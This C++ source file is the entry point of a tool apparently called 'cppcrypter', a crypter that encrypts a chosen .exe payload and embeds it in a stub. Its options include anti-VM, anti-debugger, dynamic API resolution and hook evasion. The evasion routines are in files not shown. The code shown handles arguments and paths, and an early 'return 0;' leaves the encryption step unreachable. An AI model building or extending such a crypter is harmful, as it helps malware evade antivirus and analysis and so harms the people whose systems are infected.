// main.cpp
#include "utils.h"
#include "flags.h"
#include "constant.h"
#include "config.h"
#include <iostream>
#include <cstring>
#include <fstream>
#include <filesystem>

using namespace std;
namespace fs = std::filesystem;

bool flags[FLAG_COUNT] = {false};

void displayHelp(const int COLOR){
    setColor(COLOR);
    cout << "\nUsage: ./main.exe [options]\nOptions:\n";
    cout << "\t-h, --help                 show all options, and exit\n";
    cout << "\t-n <name>                  set name for stub\n";
    cout << "\t-c, --compile              compile generate stub after writing. makefile must be configured properly\n";
    cout << "\t--payload <C:\\\\path>       specify payload. first .exe found in ./bin will be used otherwise\n";
    cout << "\t--stub <C:\\\\path>          specify stub template. by default /resource/stub_template.cpp is used\n";
    cout << "\t--rand                     enable random memory allocations\n";
    cout << "\t--vm                       enable anti-VM mode\n";
    cout << "\t--db                       enable anti-debugger mode\n";
    cout << "\t--dyn                      enable dynamic API call resolution\n";
    cout << "\t--unhook                   evades hooks\n";
    cout << "\t-p                         (debug) display default paths and exit\n";
    cout << "\t--pdb                      (debug) enable print debugging mode on stub\n";
    resetColor();
}

Config parseArgs(int argc, char* argv[], string *path_to_payload, string *path_to_output_dir, string *path_to_stub_template, string *stub_name){
    Config config;

    

    string tmpPl = *path_to_payload;

    resetColor();
    for(int i = 1; i < argc; i++){
        string arg = argv[i];

        if(arg == "--help" || arg == "-h"){
            config.help = true;
            return config;

        } else if (arg == "-p"){
            config.paths = true;
            return config;
        }
        
        if(arg == "--payload"){
            if(i + 1 >= argc){
                throw invalid_argument("Missing path after --payload");
            }

            filesystem::path path = argv[++i];

            if(!filesystem::exists(path)){
                throw invalid_argument("Invalid payload path: " + path.string());
            }

            if(!filesystem::is_regular_file(path)){
                throw invalid_argument("Payload is not regular file: " + path.string());
            }

            config.payload = true;
            config.payload_path = path.string();
            continue;

        } else if(arg == "--stub"){
            if(i + 1 >= argc){
                throw invalid_argument("Missing path after --stub");
            }

            filesystem::path path = argv[++i];

            if(!filesystem::exists(path)){
                throw invalid_argument("Invalid stub template path: " + path.string());
            }

            if(!filesystem::is_regular_file(path)){
                throw invalid_argument("Stub template is not regular file: " + path.string());
            }

            config.stub = true;
            config.stub_path = path.string();
            continue;
            
        } else if (arg == "--rand"){
            config.rand = true;
            continue;

        } else if(arg == "--vm"){
            config.vm = true;
            continue;

        } else if(arg == "--db"){
            config.db = true;
            continue;

        } else if(arg == "--dyn"){
            config.dyn = true;
            continue;

        } else if(arg == "-c" || arg == "--compile"){
            config.compile = true;
            continue;

        } else if(arg == "--pdb"){
            config.pdb = true;
            continue;

        } else if(arg == "-n"){
            config.name = true;
            config.stub_name = argv[i+1];
            continue;

        } else {
            throw invalid_argument("Unrecognized flag: " + arg);
        }
    }

    return config;
}

void displayOptions(Config& c){
    if(c.help){
        displayHelp(COLOR_INFO);
        return;
    }
    if(c.paths){
        cout << "Paths:\n\tPath to payload: " << c.payload_path << \
                "\n\tPath to output directory: " << c.output_dir << \
                "\n\tPath to stub template: " << c.stub_path << endl;
        return;
    }
    if(c.compile){
        cout << "Compilation enabled" << endl;
    }
    if(c.payload){
        cout << "Payload set to: " << c.payload_path << endl;
    }
    if(c.stub){
        cout << "Stub template path set to: " << c.stub_path << endl;
    }
    if(c.rand){
        cout << "Stub randomization enabled" << endl;
    }
    if(c.vm){
        cout << "Anti-VM enabled" << endl;
    }
    if(c.db){
        cout << "Anti-Debugger enabled" << endl;
    }
    if(c.dyn){
        cout << "Dynamic API resolution enabled" << endl;
    }    
}


int main(int argc, char * argv[]){

    fs::path executable_path = fs::absolute(argv[0]);
    fs::path base_path = executable_path.parent_path().parent_path()/"cppcrypter";  // Assuming the executable is two levels deep from the base path

    // Path to payload is initially just the directory where any payload should be placed
    // If no payload is specified with --payload, /bin will be iterated through for an exe
    // which is why /bin needs to exist first before moving forward
    // stub template has an option but its not completely ne
    string path_to_payload = (base_path / "bin").string();
    string path_to_output_dir = (base_path / "stub").string() + "\\";
    string path_to_stub_template = (base_path / "resource\\stub_template.cpp").string();
    string stub_name;
    
    Config config;

    try {
        config = parseArgs(argc, argv, &path_to_payload, &path_to_output_dir, &path_to_stub_template, &stub_name);
    } catch (const invalid_argument& e){
        setColor(COLOR_ERROR);
        cerr << "Argument error: " << e.what() << endl;
        displayHelp(COLOR_INFO);

        return 1;
    }

    displayOptions(config);
    if(config.help || config.paths){
        return 0;
    }

    // Validate default paths if they were not modified 
    // Default PL path just points to /bin rather than a specific file
    if(!config.payload){
        fs::path payload_dir = config.payload_path;

        if(!fs::exists(payload_dir) || !fs::is_directory(payload_dir)){
            cerr << "Default payload directory path error: " << payload_dir << " not found or invalid format" << endl;
            return 1;
        }
        cout << "Searching bin/ ..." << endl;
        for (const auto& entry : fs::directory_iterator(payload_dir)) {
            if (fs::is_regular_file(entry) && entry.path().extension() == ".exe"){
                config.payload_path = entry.path().string();
                cout << "Found " << config.payload_path << endl;
                break;
            }
        }
        if(fs::is_directory(config.payload_path)){
            cerr << "No exe found in " << payload_dir << endl;
            return 1;
        }
    }
    if(!config.stub){
        if(!fs::exists(config.stub_path) || !fs::is_regular_file(config.stub_path)){
            cerr << "Default stub template path error: " << config.stub_path << " not found or invalid format" << endl;
            return 1;
        }
    }
    // No option to change output directory, always validate
    if(!fs::exists(config.output_dir) || !fs::is_directory(config.output_dir)){
        cerr << "Output directory path error: " << config.output_dir << " not found or invalid format" << endl;
        return 1;
    }
    
    
    return 0;

    vector<unsigned char> buf = readBinary(path_to_payload);
    if(buf.empty()){
        setColor(COLOR_ERROR);
        cerr << "Error reading binary\n";
        resetColor();
        return 1;
    }

    // key and IV gen
    auto [key, iv] = generateKeyAndIV(LEN, LEN);
    vector<unsigned char> payloadBytes = encrypt(buf, key, iv);
    
    try {
        writeStub(config, payloadBytes, key, iv);
    } catch(runtime_error& e){
        setColor(COLOR_ERROR);
        cerr << "Error writing stub: " << e.what() << endl;
        resetColor();
        return 1;
    }
    

    return 0;
}
